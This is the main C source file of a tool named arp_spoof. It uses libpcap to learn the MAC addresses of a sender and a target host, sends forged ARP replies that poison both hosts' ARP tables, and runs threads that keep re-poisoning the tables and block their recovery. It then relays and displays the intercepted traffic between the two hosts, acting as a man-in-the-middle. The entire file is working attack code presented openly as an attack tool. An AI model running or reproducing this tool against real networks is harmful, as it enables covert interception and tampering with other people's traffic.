/* Copyright © 2018 James Sung. All rights reserved. */

#include "functions.h"

// ./arp_spoof <interface> <sender ip> <target ip>

int main(int argc, char *argv[])
{
	if (argc != 4)
	{
		PRINT_USAGE();
		puts("[*] Exiting program with -1");
		return -1;
	}
	
	puts("[+] Running program...\n");

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t *handle = pcap_open_live(argv[1], BUFSIZ, 1, 1000, errbuf);

	if (handle == NULL)
	{
		fprintf(stderr, "[-] Couldn't open device %s: %s\n", argv[1], errbuf);
		puts("[*] Exiting program with -1");
		return -1;
	}

	char                attacker_IP_char[16];
	struct in_addr     *attacker_IP_struct = (struct in_addr *)calloc(1, sizeof(in_addr));
	uint32_t            attacker_IP_int;
	uint8_t            *attacker_MAC_array = (uint8_t *)calloc(1, 6 * sizeof(uint8_t));

	struct in_addr     *sender_IP_struct = (struct in_addr *)calloc(1, sizeof(struct in_addr));
	uint32_t            sender_IP_int;
	uint8_t            *sender_MAC_array = (uint8_t *)calloc(1, 6 * sizeof(uint8_t));

	struct in_addr     *target_IP_struct = (struct in_addr *)calloc(1, sizeof(in_addr));
	uint32_t            target_IP_int;
	uint8_t            *target_MAC_array = (uint8_t *)calloc(1, 6 * sizeof(uint8_t));	

	my_etharp_hdr      *arp_request        = (my_etharp_hdr *)calloc(1, sizeof(my_etharp_hdr));
	my_etharp_hdr      *arp_reply2sender   = (my_etharp_hdr *)calloc(1, sizeof(my_etharp_hdr));
	my_etharp_hdr      *arp_reply2target   = (my_etharp_hdr *)calloc(1, sizeof(my_etharp_hdr));

	struct pcap_pkthdr *header = (struct pcap_pkthdr *)calloc(1, sizeof(struct pcap_pkthdr));
	const uint8_t      *packet;

	my_args_struct *info = (my_args_struct *)calloc(1, sizeof(my_args_struct));

	time_t start;

/* get attacker ip address */
	GET_MY_IP(attacker_IP_char, argv[1]);
	inet_aton(attacker_IP_char, attacker_IP_struct);
	attacker_IP_int = attacker_IP_struct->s_addr;
	printf("[Attacker IP  Address] "); PRINT_IP(attacker_IP_char); puts("");

/* get attacker mac address */
	GET_MY_MAC(attacker_MAC_array, argv[1]);
	printf("[Attacker MAC Address] "); PRINT_MAC(attacker_MAC_array); puts("\n");

	inet_aton(argv[2], sender_IP_struct);
	sender_IP_int = sender_IP_struct->s_addr;
	printf("[Sender   IP  Address] %s", argv[2]); puts("");

	MAKE_ARPREQ_STRUCT(arp_request, attacker_MAC_array, attacker_IP_int, sender_IP_int);
	start = time(NULL);
	do
	{
		if (time(NULL) > start + 5) { puts("[-] Failed to get sender MAC address"); puts("[*] Exiting program with -1"); exit(EXIT_FAILURE); }
		if (pcap_sendpacket(handle, (uint8_t *)arp_request, sizeof(my_etharp_hdr))) { pcap_perror(handle, (char *)"pcap_sendpacket error"); }
		if(GET_SENDER_MAC(sender_MAC_array, sender_IP_int, handle, header, packet)) { break; }
	} while(1);
	printf("[Sender   MAC Address] "); PRINT_MAC(sender_MAC_array); puts("\n");

	inet_aton(argv[3], target_IP_struct);
	target_IP_int = target_IP_struct->s_addr;
	printf("[Target   IP  Address] %s", argv[3]); puts("");

	MAKE_ARPREQ_STRUCT(arp_request, attacker_MAC_array, attacker_IP_int, target_IP_int);
	start = time(NULL);
	do
	{
		if (time(NULL) > start + 5) { puts("[-] Failed to get target MAC address"); puts("[*] Exiting program with -1"); exit(EXIT_FAILURE); }
		if(pcap_sendpacket(handle, (uint8_t *)arp_request, sizeof(my_etharp_hdr))) { pcap_perror(handle, (char *)"pcap_sendpacket error"); }
		if(GET_SENDER_MAC(target_MAC_array, target_IP_int, handle, header, packet)) { break; }
	} while(1);
	printf("[Target   MAC Address] "); PRINT_MAC(target_MAC_array); puts("\n");

	puts("[+] Retrieved all required information!\n");

	MAKE_ARPREP_STRUCT(arp_reply2sender, attacker_MAC_array, sender_MAC_array, sender_IP_int, target_IP_int);
	MAKE_ARPREP_STRUCT(arp_reply2target, attacker_MAC_array, target_MAC_array, target_IP_int, sender_IP_int);
	puts("[+] Built ARP packets\n");

	if (pcap_sendpacket(handle, (uint8_t *)arp_reply2sender, sizeof(my_etharp_hdr))) { pcap_perror(handle, (char *)"[- INIT -] pcap_sendpacket error"); }
	else { puts("[  INIT  ] sender <- attacker    target"); }
	if (pcap_sendpacket(handle, (uint8_t *)arp_reply2target, sizeof(my_etharp_hdr))) { pcap_perror(handle, (char *)"[- INIT -] pcap_sendpacket error"); }
	else { puts("[  INIT  ] sender    attacker -> target"); }
	puts(""); 

	puts("[+] Sent initial fake ARP packets to poison sender and target's ARP table for the first time\n");


	pthread_t tid1, tid2;

	strcpy(info->dev, argv[1]);
	info->sender_IP_int = sender_IP_int;
	info->target_IP_int = target_IP_int;
	memcpy(info->arp_reply2sender, (uint8_t *)arp_reply2sender, sizeof(my_etharp_hdr));
	memcpy(info->arp_reply2target, (uint8_t *)arp_reply2target, sizeof(my_etharp_hdr));

// Extra level of assurance
	pthread_create(&tid1, NULL, SEND_ARP, (void *)info);
	printf("[+] Initiated thread, periodically (%ds) poisoning arp table\n\n", SEND_ARP_PERIOD);

	pthread_create(&tid2, NULL, BLOCK_RECOVERY, (void *)info);
	puts("[+] Initiated thread, blocking arp table recovery\n");
	puts("[+] Displaying network traffic...\n");

// Relay packets
	while (1)
	{	
		int res = pcap_next_ex(handle, &header, &packet);

		if (res == 0)               { continue; }
		if (res == -1 || res == -2) { return 0; }

		uint8_t *n_packet = (uint8_t *)calloc(1, header->caplen);
		memcpy(n_packet, packet, header->caplen);
	
		int mcnt1 = 0;
		int mcnt2 = 0;

		bool smac1_ok = 0;
		bool smac2_ok = 0;

		bool dmac_ok = 0;

		bool dip_ok = 0;

		for (int i = 0; i < 6; i++)
		{
			if (((my_etharp_hdr *)n_packet)->SMAC[i] == sender_MAC_array[i]) { mcnt1++; }
			if (((my_etharp_hdr *)n_packet)->SMAC[i] == target_MAC_array[i]) { mcnt2++; }
		}

		if (mcnt1 == 6) { smac1_ok = 1; }
		if (mcnt2 == 6) { smac2_ok = 1; }

		mcnt1 = 0;
		mcnt2 = 0;

		for (int i = 0; i < 6; i++)
		{
			if (((my_etharp_hdr *)n_packet)->DMAC[i] == attacker_MAC_array[i]) { mcnt1++; }
		}

		if (mcnt1 == 6) { dmac_ok = 1; }

		if (dmac_ok)
		{
			uint16_t PCKT_ETHERTYPE = ntohs(((my_etharp_hdr *)n_packet)->ETHTYPE);
			if (PCKT_ETHERTYPE == ETHERTYPE_IP)
			{
				if (((((struct libnet_ipv4_hdr *)(n_packet + sizeof(struct libnet_ethernet_hdr)))->ip_dst).s_addr) != attacker_IP_int)
				{
					dip_ok = 1; 
				}
			}
		}

		if (smac1_ok && dmac_ok && dip_ok)
		{
			// Relay IP packets
			memcpy(((my_etharp_hdr *)n_packet)->DMAC, target_MAC_array, 6 * sizeof(uint8_t));
			memcpy(((my_etharp_hdr *)n_packet)->SMAC, attacker_MAC_array, 6 * sizeof(uint8_t));
			if (pcap_sendpacket(handle, (uint8_t *)n_packet, header->caplen)) { pcap_perror(handle, (char *)"[- RLAY -] pcap_sendpacket error"); }
			else { puts("[  RLAY  ] sender -> attacker -> target"); }
		}

		if (smac2_ok && dmac_ok && dip_ok)
		{
			// Relay IP packets
			memcpy(((my_etharp_hdr *)n_packet)->DMAC, sender_MAC_array, 6 * sizeof(uint8_t));
			memcpy(((my_etharp_hdr *)n_packet)->SMAC, attacker_MAC_array, 6 * sizeof(uint8_t));
			if (pcap_sendpacket(handle, (uint8_t *)n_packet, header->caplen)) { pcap_perror(handle, (char *)"[- RLAY -] pcap_sendpacket error"); }
			else { puts("[  RLAY  ] sender <- attacker <- target"); }
		}

		free(n_packet);
	}

	pthread_join(tid1, NULL);
	pthread_join(tid2, NULL);
	
	pcap_close(handle);
	free(info);
	free(attacker_IP_struct); free(attacker_MAC_array);
	free(sender_IP_struct);   free(sender_MAC_array);
	free(target_IP_struct);   free(target_MAC_array);
	free(header);             free(arp_request);
	free(arp_reply2sender);   free(arp_reply2target);


	puts("[*] Exiting program with 0");

	return 0;
}
